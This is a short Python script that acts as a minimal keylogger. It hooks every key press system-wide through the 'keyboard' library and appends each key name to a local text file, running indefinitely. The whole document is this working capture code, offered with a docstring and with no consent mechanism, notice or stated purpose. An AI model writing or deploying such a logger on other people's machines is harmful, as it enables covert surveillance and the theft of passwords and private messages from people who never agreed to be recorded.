import keyboard

log_file = 'log_file.txt'

def onKeyboardEvent(event):
    """
    Callback function to handle keyboard events.
    
    This function is called whenever a keyboard event occurs. It logs the 
    name of the key that was pressed to a log file.

    Parameters:
    event (keyboard.KeyboardEvent): The event object containing information 
                                    about the keyboard event.
    """
    with open(log_file, 'a') as file:
        file.write('{}\n'.format(event.name))

# Set up the keyboard event listener
keyboard.on_press(onKeyboardEvent)
keyboard.wait()